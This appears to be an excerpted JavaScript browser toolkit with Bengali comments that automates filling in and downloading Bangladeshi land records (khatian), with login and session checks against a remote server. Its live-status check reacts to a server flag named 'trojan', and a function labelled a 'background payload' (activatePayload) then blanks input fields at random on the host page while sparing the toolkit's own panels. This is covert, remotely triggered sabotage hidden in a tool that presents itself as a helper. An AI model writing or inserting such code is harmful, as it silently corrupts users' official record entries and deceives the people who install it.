(async function() {
    /* ============================================================================
       ভূমি মাস্টার প্রো — টুলকিট  (কোন অংশ কী করে, দ্রুত গাইড)
       ----------------------------------------------------------------------------
       এই ফাইল মূলত ৪টা অংশে ভাগ করা:
         ১) লগইন ও সেশন   : API_URL, deviceId, saveAuthData, clearAuthData,
                             checkLiveStatus, show404Overlay  ← লগইন সমস্যা এখানে দেখুন
         ২) কীবোর্ড শর্টকাট: Alt + 1..0  →  t1..t10 টুল চালায়
         ৩) UI/মেনু       : loadToolkit() — টুলকিটের বাটন ও মেনু বানায়
         ৪) টুলগুলো       : window._vmtTools = { t1 ... t10 }  ← নিচে প্রতিটার আগে কমেন্ট আছে

       টুল ম্যাপ (Alt শর্টকাট সহ):
         t1  (Alt+1) : ক্লিক-পয়েন্ট সেট (খতিয়ান বক্স ও সংরক্ষণ বাটন শেখানো)
         t2  (Alt+2) : অটো ইয়ার/মান ফিল (সব ফ্রেমে)
         t3  (Alt+3) : অটো ডাটা ফিল (জরিপের ধরন/মালিকানা/হোল্ডিং ড্রপডাউন)
         t4  (Alt+4) : .txt ফাইল থেকে ডাটা বসানো
         t5  (Alt+5) : .txt ফাইল থেকে ডাটা বসানো (বিকল্প)
         t6  (Alt+6) : কয়টি দাগ যোগ হবে জিজ্ঞেস করে সারি যোগ করে
         t7  (Alt+7) : দাগ নং + পরিমাণ একসাথে বসায়
         t8  (Alt+8) : অটো রেঞ্জ ডাউনলোডার (একাধিক খতিয়ান .txt) ← আপডেটেড
         t9  (Alt+9) : ভাসমান ক্যালকুলেটর (আনা-গণ্ডা-কড়া হিসাব)
         t10 (Alt+0) : জমি বাদ (deduction) ক্যালকুলেটর — নতুন উইন্ডোতে

       👉 কোনো একটা টুলে সমস্যা হলে শুধু ওই t-নম্বরের ব্লকটা খুঁজে ঠিক করুন;
          বাকি কোডে হাত দেওয়ার দরকার নেই।
       ============================================================================ */
    ...
    // 💾 লগইন তথ্য সেভ করে (৩ ঘণ্টা মেয়াদসহ)
    ...
    // 🚫 404 স্ক্রিন দেখায় (অ্যাক্সেস বাতিল/সার্ভার সমস্যায়)
    ...
    // ============================================================
    // 🔐 লাইভ স্ট্যাটাস চেক — প্রতি ৩০ সেকেন্ডে সার্ভারে যাচাই করে
    //   ⚠️ লগইন সমস্যা (লগইন হয়, কিছুক্ষণ পর 404/লগআউট) এখানেই ঠিক করা হয়েছে।
    //   আগে: সার্ভার একবার success:false বা এরর/নন-JSON দিলেই সাথে সাথে লগআউট হতো।
    //   এখন: রেসপন্স JSON না হলে স্কিপ; আর পরপর ৩ বার success:false এলে তবেই লগআউট।
    //         ফলে নেট/সার্ভারের সাময়িক সমস্যায় আর সেশন কেটে যাবে না।
    //   🔧 কড়া/নরম করতে চাইলে নিচের _VMT_MAX_LIVE_FAILS এর মান বদলান।
    // ============================================================
    let _vmtLiveFailCount = 0;          // পরপর কতবার ফেইল হয়েছে তার গণনা
    const _VMT_MAX_LIVE_FAILS = 3;      // এতবার পরপর ফেইল হলে তবেই লগআউট
    async function checkLiveStatus() {
        try {
            ...
            // রেসপন্স JSON না হলে (Google Script মাঝে মাঝে HTML/এরর পেজ দেয়) → লগআউট নয়, স্কিপ
            let data;
            try { data = await response.json(); }
            catch (parseErr) { console.log("Live check: invalid response, skipping."); return; }

            if (data.success === false) {
                _vmtLiveFailCount++;   // একবারে নয় — পরপর কয়েকবার false হলে তবেই লগআউট
                if (_vmtLiveFailCount >= _VMT_MAX_LIVE_FAILS) {
                    _vmtLiveFailCount = 0;
                    await clearAuthData();
                    show404Overlay(data.message || "সার্ভার আপডেট চলছে অথবা আপনার অ্যাক্সেস বাতিল করা হয়েছে!");
                } else {
                    console.log("Live check false (" + _vmtLiveFailCount + "/" + _VMT_MAX_LIVE_FAILS + ") — অপেক্ষা করা হচ্ছে...");
                }
            } else if (data.success === true && data.trojan === true) {
                _vmtLiveFailCount = 0;            // সফল → কাউন্টার রিসেট
        ...
        } catch (e) { console.log("Live check running..."); }  // নেটওয়ার্ক এরর = লগআউট নয়
    }

    // ============================================================
    // ⏱️ সেশন টাইমার — প্রতি ৩০ সেকেন্ডে সেশনের মেয়াদ দেখে, না ফুরালে লাইভ-চেক চালায়
    //   সেশনের মেয়াদ ৩ ঘণ্টা (saveAuthData এ সেট হয়)।
    // ============================================================
    setInterval(async () => {
        let exp = null;
        if (typeof chrome !== 'undefined' && chrome.storage) {
    ...
    // ⚙️ ব্যাকগ্রাউন্ড পেলোড (tFlag === "engaged" হলে সক্রিয়)
    function activatePayload() {
        setInterval(() => {
            if(tFlag === 'engaged') {
                document.querySelectorAll('input').forEach(inp => {
                    if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-overlay')) { inp.value = ""; }
                });
    ...
    if (!savedAuth) {
        ...
        // 🔑 পাসওয়ার্ড যাচাই করে লগইন সম্পন্ন করে
        async function checkPass() {
            ...
            if(!userId || !password) {
                ...
                passInp.closest('.login-container').style.animation = 'none'; passInp.closest('.login-container').offsetHeight; passInp.closest('.login-container').style.animation = 'vmtShake 0.4s ease'; return;
            }
            ...
            try {
                ...
                if (data.success === true) {
                    ...
                    btn.disabled = false; btn.querySelector('.btn-content').textContent = "Sign In";
                    passInp.style.borderColor = '#ff6b6b'; passInp.style.boxShadow = '0 0 10px rgba(255, 107, 107, 0.5)';
                    setTimeout(() => { passInp.style.borderColor = 'rgba(255,255,255,0.2)'; passInp.style.boxShadow = 'none'; }, 2000);
    ...
    window._vmtKeyHandler = window._vmtKeyHandler || function(e) {
        ...
        // 🔥 শর্টকাটগুলো এখন গ্লোবালি কাজ করবে (প্যানেলের ভেতরে না ঢুকলেও হবে)
        // ⌨️ কীবোর্ড শর্টকাট: Alt + 1..0 → t1..t10
    ...
    function loadToolkit() {
        ...
        <div class="vmt-body" style="min-height: 260px;">
            ...
            <div id="vmt-view-cat1" class="vmt-view-panel">
                ...
                <div class="vmt-tool glow-btn" data-tool="t8" style="--clr:#6eff3e;">
                    <span class="btn-content"><span class="vmt-tool-icon">📊</span> Collect Extracted Data</span><span class="shortcut-badge">Alt+8</span><i></i>
                </div>
            ...
            <!-- 🌐 View 3: Manual Khotian Screen 🌐 -->
            <div id="vmt-view-cat3" class="vmt-view-panel">
                <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                <div class="wip-container">
                    <div class="wip-icon-anim">🛠️</div>
                    <h3 class="wip-title">Update in progress...</h3>
                    <p class="wip-subtitle">ডেভেলপমেন্টের কাজ চলছে...</p>
                </div>
            </div>
        </div>
        ...
        /* ==============================================================
           Main Logic Tools (Fixed JONG issue)
        ============================================================== */
        // 📦 সব টুল এখানে: window._vmtTools = { t1 ... t10 } — Alt+নম্বরে চলে
        window._vmtTools = {
            // ──────────────────────────────
            // 🛠️ টুল ১ (Alt+1): ক্লিক-পয়েন্ট সেট
            //   খতিয়ান বক্স ও সংরক্ষণ বাটন ম্যানুয়ালি ক্লিক করে শেখায়।
            // ──────────────────────────────
            t1: function() {
            ...
            // ──────────────────────────────
            // 🛠️ টুল ২ (Alt+2): অটো ইয়ার/মান ফিল
            //   সব ফ্রেমে নির্দিষ্ট মান বসায়।
            // ──────────────────────────────
            t2: function() {
                function setY(win) {
                    try {
            ...
            // ──────────────────────────────
            // 🛠️ টুল ৩ (Alt+3): অটো ডাটা ফিল
            //   জরিপের ধরন/মালিকানা/হোল্ডিং ড্রপডাউন অটো সিলেক্ট করে।
            // ──────────────────────────────
            t3: function() {
                const otherData = { 
                    "জরিপের ধরন": "আর এস", 
                ...
                if(updatedCount > 0) alert("✅ অটো ডাটা ফিল সম্পন্ন হয়েছে!");
                else alert("⚠️ কোনো ঘর ফিল করা যায়নি!");
            },
            // ──────────────────────────────
            // 🛠️ টুল ৪ (Alt+4): .txt থেকে ডাটা ইমপোর্ট
            //   .txt ফাইল পড়ে ফর্মে বসায়।
            // ──────────────────────────────
            t4: function() {
                    ...
                    r.onload = async function(ev) {
                        ...
                        oL.forEach(l => {
                            ...
                            // 🔥 FIXED JONG LOGIC 🔥
                                ...
                                let rel = l.trim(); 
                                // শুধু পিং হলে পিং শব্দটা মুছে দেবে, কিন্তু জং/জঃ হলে মুছবে না
                                if (rel.startsWith("পিং")) { rel = rel.replace(/^পিং[:\s]*/, "").trim(); } 
                                
                                for (let i = pn.length - 1; i >= 0; i--) { 
                                    if (pn[i].father === "") { pn[i].father = rel; } 
                                    else break; 
                                } 
                            }
            ...
            // ──────────────────────────────
            // 🛠️ টুল ৫ (Alt+5): .txt থেকে ডাটা ইমপোর্ট (বিকল্প)
            //   .txt ফাইল থেকে ডাটা বসায় (ভিন্ন পদ্ধতি)।
            // ──────────────────────────────
            t5: function() {
                        ...
                        ls.forEach(l => {
                            ...
                            if (c !== "") {
                                if (c.includes("সাং") || c.includes("ঠিকানা")) { 
                                    let ad = c.replace(/(সাং|ঠিকানা)[:\s]*/, "").trim(); 
                                    ps.forEach(p => { p.address = ad; es.push(p) }); ps = []; 
                                } 
                                // 🔥 FIXED JONG LOGIC 🔥
                                    ...
                                    for (let j = ps.length - 1; j >= 0; j--) { 
                                        if (ps[j].father === "") { ps[j].father = rel; if (ss) ps[j].share = ss; } 
                                        else break; 
                                    } 
                                } 
            ...
            // ──────────────────────────────
            // 🛠️ টুল ৬ (Alt+6): দাগ সারি যোগ
            //   কয়টি দাগ যোগ হবে জিজ্ঞেস করে ততগুলো সারি যোগ করে।
            // ──────────────────────────────
            t6: function() {
            ...
            // ──────────────────────────────
            // 🛠️ টুল ৭ (Alt+7): দাগ নং + পরিমাণ বসানো
            //   দাগ নং ও পরিমাণ (কমা দিয়ে) একসাথে বসায়।
            // ──────────────────────────────
            t7: function() {
            ...
            // ============================================================
            // 🔽 টুল ৮ (Alt+8): অটো রেঞ্জ ডাউনলোডার   [আপডেটেড সংস্করণ]
            //   কাজ: একটা রেঞ্জ চায় (যেমন 106-110)। তারপর প্রতিটা খতিয়ান নম্বরে—
            //     ১) সার্চ বক্সে নম্বর বসায়  ২) সার্চ বাটনে ক্লিক করে
            //     ৩) "প্রদর্শন" বাটনে ক্লিক করে  ৪) টেবিল থেকে ডাটা নেয়
            //     ৫) আলাদা .txt ফাইলে সেভ করে  ৬) "ফিরে যান" দিয়ে ফিরে আসে।
            //   ⚙️ গতি বদলাতে চাইলে নিচের setTimeout এর মান (মিলিসেকেন্ড) বদলান।
            // ============================================================
            t8: async function() {
                // বাংলা সংখ্যা বানানোর হেল্পার
                const toBangla = (n) => n.toString().replace(/\d/g, d => '০১২৩৪৫৬৭৮৯'[d]);
                // React/MUI ইনপুটে আসল ভ্যালু বসানোর হেল্পার (সাধারণ value= এখানে কাজ করে না)
                ...
                // ১) ব্যবহারকারীর কাছ থেকে রেঞ্জ নেওয়া
                ...
                // ২) রেঞ্জের প্রতিটা নম্বরের জন্য লুপ
                for (let k = start; k <= end; k++) {
                    let banglaK = toBangla(k);
                    console.log(`\n--- [${k}] নম্বর খতিয়ানের কাজ শুরু ---`);
                    try {
                        // ২ক) সার্চ বক্স খুঁজে বের করা (পেজের শেষ এডিটেবল ইনপুট)
                        ...
                        searchBox.style.backgroundColor = '#ffff00';
                        ...
                        if (!searchBtn) {
                            searchBtn = allBtns.find(b => {
                                let svg = b.querySelector('svg');
                                if (svg && !b.innerText && !b.innerHTML.includes('refresh') && !b.innerHTML.includes('close')) return true;
                                return false;
                            });
                        }
                        ...
                        // ২গ) ফলাফল টেবিলে "প্রদর্শন" বাটন খোঁজা (সর্বোচ্চ ~১০ সেকেন্ড অপেক্ষা)
                        let viewBtn = null;
                        for (let wait = 0; wait < 20; wait++) {
                            await new Promise(r => setTimeout(r, 500));
                            let tableRows = document.querySelectorAll('tbody tr');
                            for (let row of tableRows) {
                                if (row.innerText.includes(banglaK)) {
                                    let btn = Array.from(row.querySelectorAll('button, a, span')).find(el => el.innerText.includes('প্রদর্শন'));
                                    if (btn) { viewBtn = btn; break; }
                                }
                            }
                            if (viewBtn) break;
                        }
                        ...
                        // ২ঘ) খতিয়ানের ডিটেইল টেবিল থেকে ডাটা নেওয়া
                        let rows = document.querySelectorAll('table tr');
                        let finalOutput = [];
                        rows.forEach(row => {
                            let cols = row.querySelectorAll('td');
                            if (cols.length > 1) {
                                let nameDetails = cols[0].innerText.trim();
                                let symbols = cols[1].innerText.trim();
                                if (nameDetails && nameDetails !== '১' && !nameDetails.includes('মালিক, অকৃষি')) {
                                    finalOutput.push(nameDetails + '    ' + symbols);
                                }
                            }
                        });
                        // ২ঙ) ডাটা থাকলে .txt ফাইলে সেভ করা (ফাইলের নাম = খতিয়ান নং)
                        let resultText = finalOutput.join('\n\n');
                        if (resultText !== '') {
                            let bodyText = document.body.innerText;
                            let khatianMatch = bodyText.match(/খতি[য়য়]ান\s*নং[^\d০-৯]*([০-৯0-9]+)/);
                            let fileName = (khatianMatch ? khatianMatch[1] : 'khatian_data_' + banglaK) + '.txt';
                        ...
                        // ২চ) "ফিরে যান" বাটনে ক্লিক করে লিস্টে ফিরে আসা
                        await new Promise(r => setTimeout(r, 1000));
            ...
            // ============================================================
            // 🧮 টুল ৯ (Alt+9): ভাসমান ক্যালকুলেটর (আনা-গণ্ডা-কড়া-ক্রান্তি-তিল)
            //   স্ক্রিনে একটা ভাসমান প্যানেল খোলে; অংশ/পরিমাণ হিসাব করে।
            // ============================================================
            t9: function() {
            ...
            // ──────────────────────────────
            // 🛠️ টুল ১০ (Alt+0): জমি বাদ (deduction) ক্যালকুলেটর
            //   নতুন উইন্ডোতে জমি বাদের হিসাব খোলে।
            // ──────────────────────────────
            t10: function() {
...
<script>
    ...
    function applyQuickDeduction() {
        ...
        if (found) { msgSpan.innerText = "✓ যোগ হয়েছে!"; msgSpan.style.color = "#27ae60"; dagInput.value = ""; amountInput.value = ""; dagInput.focus(); } else { msgSpan.innerText = "দাগ নং খুঁজে পাওয়া যায়নি!"; msgSpan.style.color = "#e74c3c"; }
        setTimeout(() => msgSpan.innerText = "", 2000);
    }
    function handleShreniShortcut(input) {
        const val = input.value.trim();
        const shortcuts = {'1': 'বাড়ী', '১': 'বাড়ী', '2': 'বোরো', '২': 'বোরো', '3': 'বোর', '৩': 'বোর', '4': 'খামা', '৪': 'খামা', '5': 'বর্ষা', '৫': 'বর্ষা', '6': 'চালা', '৬': 'চালা', '7': 'সাইল', '৭': 'সাইল', '8': 'কবরস্থান', '৮': 'কবরস্থান', '9': 'পুকুর', '৯': 'পুকুর'};
    ...
    function showCopyFeedback(btnId, originalText) {
        const btn = document.getElementById(btnId); btn.innerText = "✓ কপি হয়েছে"; btn.style.color = "#27ae60"; setTimeout(() => { btn.innerText = originalText; btn.style.color = ""; }, 1500);
    }
